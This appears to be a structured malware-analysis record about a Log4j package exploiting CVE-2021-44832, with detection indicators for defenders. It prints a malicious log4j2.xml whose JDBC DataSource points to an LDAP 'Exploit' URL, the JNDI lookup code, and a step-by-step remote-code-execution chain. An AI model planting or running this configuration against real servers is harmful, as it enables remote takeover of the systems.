package_info.why_malicious: The package contains a deserialization vulnerability (CVE-2021-44832) that allows remote code execution if an attacker can control the Log4j configuration file, specifically by injecting a malicious JDBCAppender DataSource element with a JNDI LDAP URL. This enables arbitrary code execution via remote class loading and deserialization.

malicious_snippets.code_snippet:
<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="error">
    <Appenders>
        <JDBC name="databaseAppender" tableName="dbo.application_log">
            <DataSource jndiName="ldap://127.0.0.1:1389/Exploit" />
            <Column name="eventDate" isEventTimestamp="true" />
            <Column name="level" pattern="%level" />
            <Column name="logger" pattern="%logger" />
            <Column name="message" pattern="%message" />
            <Column name="exception" pattern="%ex{full}" />
        </JDBC>
    </Appenders>
    <Loggers>
        <Root level="warn">
            <AppenderRef ref="databaseAppender"/>
        </Root>
    </Loggers>
</Configuration>
malicious_snippets.code_behavior: At import-time or application startup, the configuration file instructs Log4j to instantiate a JDBCAppender with a DataSource whose jndiName is an attacker-controlled LDAP URL. This causes Log4j to perform a JNDI lookup to the specified LDAP server, which can return a serialized Java object or remote class, leading to arbitrary code execution.

malice_analysis.why_suspicious: The use of a remote JNDI LDAP URL in a logging configuration is highly unusual and enables remote code execution via deserialization.
malice_analysis.violated_expectations: Normal logging configurations should not reference remote JNDI resources, especially over LDAP, nor should they allow remote class loading or deserialization.
malice_analysis.similar_legitimate_use: JNDI is sometimes used for legitimate resource lookups in enterprise environments, but not for untrusted or remote LDAP endpoints.
key_indicators: Presence of DataSource jndiName with ldap:// URL
Remote configuration file loaded over HTTP/FTP

malicious_snippets.code_snippet:
final InitialContext context = new InitialContext();
final DataSource dataSource = (DataSource) context.lookup(jndiName);
malicious_snippets.code_behavior: At import-time or application startup, the code performs a JNDI lookup using the jndiName specified in the configuration. If the jndiName points to a remote LDAP server, the lookup can result in the loading and deserialization of attacker-controlled Java objects, leading to code execution.

malice_analysis.why_suspicious: Direct JNDI lookups using attacker-controlled input are a well-known vector for remote code execution.
malice_analysis.violated_expectations: Expected behavior is to use only trusted, local JNDI resources, not arbitrary remote endpoints.
malice_analysis.similar_legitimate_use: JNDI lookups are legitimate for internal resource discovery, but not for untrusted or external URLs.
key_indicators: Casting result of JNDI lookup to DataSource
No restriction on protocol or host in jndiName

malicious_snippets.code_behavior: At import-time or application startup, the code sets system properties to load a remote Log4j configuration file and to allow remote codebases for LDAP JNDI lookups, enabling the attack chain.

malice_analysis.why_suspicious: Setting configurationFile to a remote URL and enabling trustURLCodebase are both highly risky and enable remote code execution.
malice_analysis.violated_expectations: Configuration files should be local and trustURLCodebase should not be enabled in production.
malice_analysis.similar_legitimate_use: Remote configuration may be used in some enterprise setups, but is rarely safe.

attack_chain.action: Attacker uploads a malicious log4j2.xml configuration file to a remote location.
attack_chain.leads_to: Server fetches and loads the malicious configuration.

attack_chain.action: Server fetches the remote configuration file (log4j2.xml) via HTTP.
attack_chain.leads_to: Server parses and applies the configuration.

attack_chain.action: Log4j initializes JDBCAppender with DataSource jndiName pointing to attacker-controlled LDAP server.
attack_chain.leads_to: JNDI lookup to attacker's LDAP server.

attack_chain.action: JNDI lookup is performed, contacting the attacker's LDAP server.
attack_chain.leads_to: LDAP server returns malicious serialized Java object or class.

attack_chain.action: Log4j deserializes and executes the malicious payload from the LDAP server.
attack_chain.leads_to: Attacker gains remote code execution on the server.

behavioral_signatures: JNDI lookups to external LDAP servers during application startup
Loading of remote configuration files via HTTP/FTP
Presence of DataSource jndiName with ldap:// or other remote protocols in log4j2.xml
file_indicators: log4j2.xml with DataSource jndiName referencing ldap://
Remote log4j2.xml configuration files loaded via HTTP/FTP
network_indicators: Outbound LDAP requests to non-corporate or untrusted servers
HTTP requests to fetch log4j2.xml from external sources
detection_knowledge.how_to_detect: Monitor for log4j2.xml files (local or remote) that contain DataSource elements with jndiName attributes referencing ldap:// or other remote protocols. Detect outbound LDAP connections from application servers, especially during startup or configuration reload. Flag any use of System.setProperty to set log4j2.configurationFile to a remote URL or enabling com.sun.jndi.ldap.object.trustURLCodebase. Alert on any JNDI lookups to external servers or deserialization of remote objects.
